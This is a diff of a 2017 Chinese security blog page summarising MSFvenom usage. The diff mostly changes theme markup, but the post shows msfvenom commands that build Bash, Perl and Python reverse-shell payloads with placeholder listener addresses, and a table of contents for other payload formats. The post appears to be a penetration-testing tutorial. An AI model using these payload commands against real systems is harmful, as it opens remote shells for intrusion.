@@ -1,7 +1,174 @@
-<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> MSFvenom使用总结 · Damit5's Blog</title><meta name="description" content="纸上得来终觉浅，绝知此事要躬行。"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/jekyll.css"><!--[if lt IE 9]>
-<script src="js/html5shiv.min.js"></script>
-<script src="js/respond.min.js"></script>
-<![endif]--></head><body><header class="row-flex-row limit-width vh-center"><a href="/" class="logo"><img src="/favicon.png"></a><nav><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-link">主页</a></li><li class="nav-list-item"><a href="/archives/" class="nav-link active">   博客</a></li><li class="nav-list-item"><a href="http://damit5.kiwi/AboutMe/" target="_blank" class="nav-link">关于我</a></li><li class="nav-list-item"><a href="http://damit5.kiwi/Link/" target="_blank" class="nav-link">友情链接</a></li><li class="nav-list-item"><a href="https://github.com/damit5" target="_blank" class="nav-link">github</a></li><li class="nav-list-item"><a href="mailto:damit5@protonmail.com" target="_blank" class="nav-link">email</a></li><li class="nav-list-item"><a href="/atom.xml" class="nav-link">rss</a></li></ul></nav></header><div class="container limit-width"><section class="row-flex-row"><div class="post"><article class="post-block"><h2 class="post-title"><a href="/2017/09/30/MSFvenom使用总结/" class="post-title-link">MSFvenom使用总结</a></h2><div class="post-meta"><ul class="post-tag-list"><li class="post-tag-item"><a href="/tags/Metasploit-Framework/" class="post-tag-link">Metasploit-Framework</a></li></ul><div class="post-time">2017年9月30日 星期六</div></div><div class="post-content"><script src="/assets/js/APlayer.min.js"> </script><a id="more"></a>
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="纸上得来终觉浅，绝知此事要躬行。">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="Damit5&#39;s Blog" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        MSFvenom使用总结｜undefined
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite.com/2017/09/30/MSFvenom使用总结/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    Damit5&#39;s Blog
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>MSFvenom使用总结</h1>
+                    
+                    <span class="meta">
+                         作者 Damit 5
+                        <span>
+                          日期 2017-09-30
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#Metasploit-Framework"
+                           title="Metasploit-Framework">Metasploit-Framework</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            MSFvenom使用总结
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <script src="/assets/js/APlayer.min.js"> </script><a id="more"></a>
 <div id="aplayer1" class="aplayer" style="margin-bottom: 20px;"></div>
 		<script>
 			new APlayer({
@@ -75,7 +242,164 @@ document.getElementsByTagName("head")[0].appendChild(script);
 <h4 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
 <h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
 <h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="How-to-use-msfvenom"><a href="#How-to-use-msfvenom" class="headerlink" title="How-to-use-msfvenom"></a><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="external">How-to-use-msfvenom</a></h3><h3 id="MSFvenom"><a href="#MSFvenom" class="headerlink" title="MSFvenom"></a><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="external">MSFvenom</a></h3></div></article><div class="pagination"><a href="/2017/09/30/Python-argparse-模块的简易使用/" class="pagination-prev">PREV</a><a href="/2017/09/30/Meterpreter-常用命令和后渗透/" class="pagination-next">NEXT</a></div><div class="comments"></div></div><aside class="sidebar"><h3>分类标签</h3><ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit-Framework/">Metasploit-Framework</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/其他/">其他</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/权限维持/">权限维持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul><h3>最新文章</h3><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/11/13/Windows系统远程桌面的多用户登录/">Windows系统远程桌面的多用户登录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/15/XSS-绕过常用语句/">XSS 绕过常用语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Windows-MySQL-的安装/">Windows MySQL 的安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/利用Python-Selenium库模拟登陆/">利用Python Selenium库模拟登陆</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Windows-Shift-后门/">Windows Shift 后门</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Python-socket模块实现简易的通信/">Python socket模块实现简易的通信</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Python-argparse-模块的简易使用/">Python argparse 模块的简易使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/MSFvenom使用总结/">MSFvenom使用总结</a></li></ul></aside></section></div><div class="extra"></div><footer class="footer"><div class="row-flex-row limit-width vh-center"><div class="copyright"><P>© 2017 <a href="/">Damit 5</P></div><div class="power"><p><a href="http://pinggod.com/">Sean Sun</a>, 
-<a href="https://hexo.io">Hexo</a>, 
-<a href="https://github.com/">GitHub</a>, 
-<a href="https://jekyllrb.com/">Jekyll</a></p></div></div></footer><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-80781234-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "//hm.baidu.com/hm.js?ee75cf111111aa99f8540efa2570970";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><h3 id="How-to-use-msfvenom"><a href="#How-to-use-msfvenom" class="headerlink" title="How-to-use-msfvenom"></a><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom" target="_blank" rel="external">How-to-use-msfvenom</a></h3><h3 id="MSFvenom"><a href="#MSFvenom" class="headerlink" title="MSFvenom"></a><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="external">MSFvenom</a></h3>
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/09/30/Python-argparse-模块的简易使用/" data-toggle="tooltip" data-placement="top"
+                           title="Python argparse 模块的简易使用">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/09/30/Meterpreter-常用命令和后渗透/" data-toggle="tooltip" data-placement="top"
+                           title="Meterpreter 常用命令和后渗透">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0×00-参数介绍"><span class="toc-text">0×00 参数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#可执行的格式-Executable-formats"><span class="toc-text">可执行的格式 ( Executable formats )</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#需要变换的格式-Transform-formats"><span class="toc-text">需要变换的格式: ( Transform formats )</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#选择架构平台"><span class="toc-text">选择架构平台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Platforms"><span class="toc-text">Platforms:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0×01-Msfvenom实例"><span class="toc-text">0×01 Msfvenom实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#普通生成"><span class="toc-text">普通生成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编码处理型"><span class="toc-text">编码处理型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#捆绑"><span class="toc-text">捆绑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MAC"><span class="toc-text">MAC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP"><span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Asp"><span class="toc-text">Asp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Aspx"><span class="toc-text">Aspx</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSP"><span class="toc-text">JSP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#War"><span class="toc-text">War</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bash"><span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python"><span class="toc-text">Python</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#How-to-use-msfvenom"><span class="toc-text">How-to-use-msfvenom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSFvenom"><span class="toc-text">MSFvenom</span></a></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Damit5&#39;s Blog 2017
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="">
+</body>
+
+</html>
